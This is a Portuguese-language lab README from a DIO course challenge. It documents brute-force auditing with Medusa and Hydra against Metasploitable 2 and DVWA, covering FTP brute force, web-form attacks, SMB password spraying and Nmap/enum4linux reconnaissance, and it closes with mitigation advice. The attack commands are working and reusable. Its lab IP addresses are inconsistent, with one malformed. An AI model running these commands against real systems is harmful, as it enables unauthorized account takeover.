# 🛡️ Ataques de Força Bruta com Medusa e Kali Linux — Laboratório de Segurança Ofensiva e Defensiva

Projeto prático do desafio da **DIO** sobre auditoria de senhas em ambiente controlado. Aqui eu simulo ataques de força bruta contra serviços **FTP**, **formulário web (DVWA)** e **SMB (password spraying)**, documento cada etapa e — o mais importante — proponho **medidas de mitigação** para cada cenário.

> ⚠️ **Aviso legal e ético**
> Todo o conteúdo deste repositório foi executado em um **laboratório isolado**, com máquinas virtuais **intencionalmente vulneráveis** (Metasploitable 2 e DVWA), em uma **rede interna/host-only sem acesso à internet**.
> Executar ataques de força bruta contra sistemas de terceiros **sem autorização explícita por escrito é crime** (no Brasil, Lei nº 12.737/2012 — "Lei Carolina Dieckmann" — e Marco Civil da Internet). O objetivo deste projeto é **educacional e defensivo**.

---

## 📑 Sumário

- [Objetivos de aprendizagem](#-objetivos-de-aprendizagem)
- [O que é um ataque de força bruta](#-o-que-é-um-ataque-de-força-bruta)
- [Arquitetura do laboratório](#-arquitetura-do-laboratório)
- [Configuração do ambiente](#-configuração-do-ambiente)
- [Reconhecimento com Nmap](#-reconhecimento-com-nmap)
- [Wordlists](#-wordlists)
- [Cenário 1 — Força bruta em FTP](#-cenário-1--força-bruta-em-ftp)
- [Cenário 2 — Formulário web (DVWA)](#-cenário-2--formulário-web-dvwa)
- [Cenário 3 — Password spraying em SMB](#-cenário-3--password-spraying-em-smb)
- [Medidas de mitigação](#-medidas-de-mitigação)
- [Reflexões e aprendizados](#-reflexões-e-aprendizados)
- [Estrutura do repositório](#-estrutura-do-repositório)
- [Referências](#-referências)

---

## 🎯 Objetivos de aprendizagem

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB);
- Utilizar o **Kali Linux** e o **Medusa** para auditoria de senhas em ambiente controlado;
- Documentar processos técnicos de forma clara e reproduzível;
- Reconhecer vulnerabilidades comuns e propor **medidas de mitigação**;
- Utilizar o GitHub como portfólio técnico.

---

## 🧠 O que é um ataque de força bruta

Um ataque de **força bruta** tenta adivinhar credenciais testando sistematicamente combinações de usuário/senha até encontrar uma válida. Variações importantes:

| Técnica | Como funciona | Quando é usada |
|---|---|---|
| **Força bruta pura** | Testa todas as combinações possíveis de caracteres | Senhas curtas/simples |
| **Ataque de dicionário** | Testa senhas de uma lista pré-definida (*wordlist*) | Senhas comuns e vazadas |
| **Password spraying** | Testa **uma** senha comum contra **muitos** usuários | Evita o bloqueio de conta por tentativas |
| **Credential stuffing** | Reutiliza pares usuário/senha vazados de outros sites | Usuários que repetem senhas |

O **Medusa** é um *brute-forcer* paralelo, modular e rápido, incluído no Kali Linux. Ele suporta diversos protocolos via módulos (`ftp`, `ssh`, `smbnt`, `http`, `web-form`, etc.).

Para listar os módulos disponíveis:

```bash
medusa -d
```

Principais parâmetros:

| Parâmetro | Função |
|---|---|
| `-h` / `-H` | Host alvo / arquivo com lista de hosts |
| `-u` / `-U` | Usuário único / arquivo com lista de usuários |
| `-p` / `-P` | Senha única / arquivo com lista de senhas (wordlist) |
| `-M` | Módulo (serviço) a ser atacado |
| `-m` | Parâmetros específicos do módulo |
| `-t` | Número de *threads* (tentativas simultâneas) |
| `-f` / `-F` | Para após a primeira credencial válida (no host / global) |
| `-n` | Porta customizada |
| `-v` | Nível de verbosidade |

---

## 🏗️ Arquitetura do laboratório

```
┌─────────────────────────┐        Rede Interna / Bridge           ┌──────────────────────────────┐
│       Kali Linux        │                                        │       Metasploitable 2       │
│   (Atacante / Auditor)  │ <───────────────────────────────────>  │   (Alvo vulnerável)          │
│   192.168.1.101         │                                        │   192.168.56.1.114           │
│   - Medusa              │                                        │   - FTP (vsftpd)  :21        │
│   - Nmap                │                                        │   - SMB (Samba)   :139/445   │
│   - enum4linux          │                                        │   - DVWA (Apache) :80        │
└─────────────────────────┘                                        └──────────────────────────────┘
```


## ⚙️ Configuração do ambiente

### 1. Softwares utilizados
- **VirtualBox** (hipervisor)
- **Kali Linux** (VM atacante)
- **Metasploitable 2** (VM alvo) — já traz FTP, SMB e DVWA
- *(Opcional)* DVWA instalado separadamente, caso queira a versão mais recente

### 2. Rede isolada no VirtualBox
Para garantir que nada "vaze" para fora do laboratório:

1. Em cada VM: **Configurações → Rede**
2. Escolha **Rede Interna** (ou **Modo Bridge **)


### 3. Descobrindo os IPs
```bash
# No Kali
ip a

# No Metasploitable 2 (login: msfadmin / msfadmin)
ifconfig
```

### 4. Teste de conectividade
```bash
ping -c 4 192.168.56.20
```

📸 *`/images/01-configuracao-rede.png`*

---

## 🔍 Reconhecimento com Nmap

Antes de atacar, identifique os serviços e portas abertas do alvo:

```bash
# Varredura de serviços e versões
nmap -sV 192.168.56.20

# Varredura completa com scripts padrão
nmap -sC -sV -p- 192.168.56.20

# Enumeração específica de SMB
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users 192.168.56.20
```

Isso confirma que FTP (21), SMB (139/445) e HTTP (80) estão ativos.

📸 *`/images/02-nmap-scan.png`*

---

## 📝 Wordlists

Para um laboratório, listas pequenas já demonstram o conceito.

**`wordlists/usuarios.txt`**
```
admin
root
msfadmin
user
service
guest
```

**`wordlists/senhas.txt`**
```
123456
password
admin
msfadmin
root
qwerty
123456789
letmein
```

O Kali também traz a clássica **rockyou.txt**:
```bash
# Descompactar (vem compactada por padrão)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
ls -lh /usr/share/wordlists/rockyou.txt
```

> Boa prática: comece com wordlists pequenas para validar o comando e só depois use listas grandes.

---

## 🎯 Cenário 1 — Força bruta em FTP

O Metasploitable 2 roda o **vsftpd** na porta 21.

```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -t 4 \
       -f
```

- `-U` lista de usuários
- `-P` lista de senhas
- `-M ftp` módulo FTP
- `-t 4` quatro tentativas simultâneas
- `-f` para ao encontrar a primeira credencial válida

**Saída esperada (exemplo):**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do acesso
```bash
ftp 192.168.56.20
# informe o usuário/senha encontrados
```

📸 *`/images/03-medusa-ftp.png`*

---

## 🌐 Cenário 2 — Formulário web (DVWA)

A DVWA (Damn Vulnerable Web Application) possui uma página de login ideal para testar ataques a formulários.

### Preparação
1. Acesse a DVWA pelo navegador: `http://192.168.56.20/dvwa`
2. Faça login inicial (`admin` / `password`)
3. Em **DVWA Security**, defina o nível como **Low** para o exercício
4. Vá até o módulo **Brute Force**

### Captura dos parâmetros
Use o **DevTools (F12) → aba Network** para inspecionar a requisição de login e identificar:
- O método (GET/POST) e a URL
- Os campos do formulário (`username`, `password`, `Login`)
- A **mensagem de erro** exibida em falha (ex.: *"Username and/or password incorrect."*)
- O **cookie de sessão** (`PHPSESSID`) e, em alguns casos, o token anti-CSRF (`user_token`)

### Exemplo com Medusa (módulo web-form)
```bash
# Consulte as opções exatas do módulo na sua versão:
medusa -M web-form -q

medusa -h 192.168.56.20 \
       -u admin \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM:"/dvwa/vulnerabilities/brute/" \
       -m FORM-DATA:"GET?username=&password=&Login=Login" \
       -m DENY-SIGNAL:"incorrect" \
       -t 2
```

> ⚠️ **Observação honesta:** a DVWA usa **cookie de sessão** e, a partir de certas versões/níveis, um **token CSRF** por requisição, o que torna o ataque a formulário mais complexo. Muitos estudos usam o **Hydra** (`http-get-form` / `http-post-form`) para esse caso, pois o manuseio de cookies costuma ser mais direto. Exemplo com Hydra:

```bash
hydra 192.168.56.20 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=SEU_SESSID; security=low" \
  -l admin -P wordlists/senhas.txt
```

📸 *`/images/04-dvwa-bruteforce.png`*

---

## 🔑 Cenário 3 — Password spraying em SMB

No *password spraying*, testamos **uma senha comum** contra **vários usuários**, reduzindo o risco de bloqueio de contas.

### Etapa 1 — Enumeração de usuários
```bash
# Com enum4linux
enum4linux -U 192.168.56.20

# Ou com Nmap
nmap -p 445 --script smb-enum-users 192.168.56.20
```
Salve os usuários encontrados em `wordlists/usuarios_smb.txt`.

### Etapa 2 — O spraying com Medusa
```bash
medusa -h 192.168.56.20 \
       -U wordlists/usuarios_smb.txt \
       -p 'msfadmin' \
       -M smbnt \
       -t 1
```

- `-U` lista de usuários enumerados
- `-p 'msfadmin'` **uma única** senha (característica do spraying)
- `-M smbnt` módulo SMB
- `-t 1` baixa concorrência para simular um ataque "silencioso"

### Validação do acesso
```bash
smbclient -L //192.168.56.20 -U msfadmin
```

📸 *`/images/05-smb-spraying.png`*

---

## 🛡️ Medidas de mitigação

O objetivo real de um exercício como este é aprender a **defender**. Abaixo, as contramedidas por camada:

### Políticas de senha e autenticação
- **Senhas fortes e longas** (mínimo 12–14 caracteres, com complexidade) e proibição de senhas comuns/vazadas;
- **Autenticação multifator (MFA/2FA)** — mitiga força bruta mesmo com a senha correta;
- **Rotação e verificação** contra listas de senhas comprometidas (ex.: *Have I Been Pwned*).

### Controles de tentativa
- **Bloqueio de conta** (*account lockout*) após X tentativas falhas;
- **Rate limiting / throttling** nas requisições de autenticação;
- **Atrasos progressivos** (*exponential backoff*) entre tentativas;
- **CAPTCHA** em formulários web após algumas falhas;
- **Fail2ban** para banir IPs com muitas falhas:
  ```bash
  sudo apt install fail2ban
  # configurar jails para sshd, vsftpd, etc. em /etc/fail2ban/jail.local
  ```

### Hardening por serviço
- **FTP:** desabilitar login anônimo, preferir **FTPS/SFTP** (criptografado), restringir usuários;
- **SMB:** **desativar o SMBv1**, exigir **assinatura SMB** (*SMB signing*), restringir sessões nulas/anônimas, aplicar princípio do menor privilégio;
- **Web:** tokens anti-CSRF, sessões seguras (`HttpOnly`, `Secure`), não revelar se o usuário existe nas mensagens de erro.

### Monitoramento e resposta
- **Logs centralizados** e alertas para picos de falhas de autenticação (SIEM);
- **Detecção de password spraying** (muitas contas, uma senha, de um mesmo IP);
- **Segmentação de rede** para limitar o alcance lateral de um invasor.

---

## 💭 Reflexões e aprendizados

> *Preencha com suas impressões pessoais. Algumas perguntas para guiar:*

- O que mais te surpreendeu sobre a velocidade/facilidade de um ataque de dicionário?
- Qual cenário foi mais difícil de automatizar e por quê (ex.: o CSRF da DVWA)?
- Como a diferença entre **força bruta** e **password spraying** muda a estratégia de defesa?
- Depois deste laboratório, quais medidas você aplicaria primeiro em um sistema real?

---

## 📂 Estrutura do repositório

```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   └── usuarios_smb.txt
├── scripts/
│   └── (scripts auxiliares, se houver)
└── images/
    ├── 01-configuracao-rede.png
    ├── 02-nmap-scan.png
    ├── 03-medusa-ftp.png
    ├── 04-dvwa-bruteforce.png
    └── 05-smb-spraying.png
```

---

## 📚 Referências

- [Kali Linux — Site Oficial](https://www.kali.org/)
- [Medusa — Documentação](https://github.com/jmk-foofus/medusa/wiki)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap — Manual Oficial](https://nmap.org/book/man.html)
- [Metasploitable 2 — Documentação](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [GitHub Markdown — Guia de sintaxe](https://docs.github.com/pt/get-started/writing-on-github)

---

> Projeto desenvolvido como parte do desafio da **[Digital Innovation One (DIO)](https://www.dio.me/)**.
> Uso estritamente educacional, em ambiente controlado e autorizado.
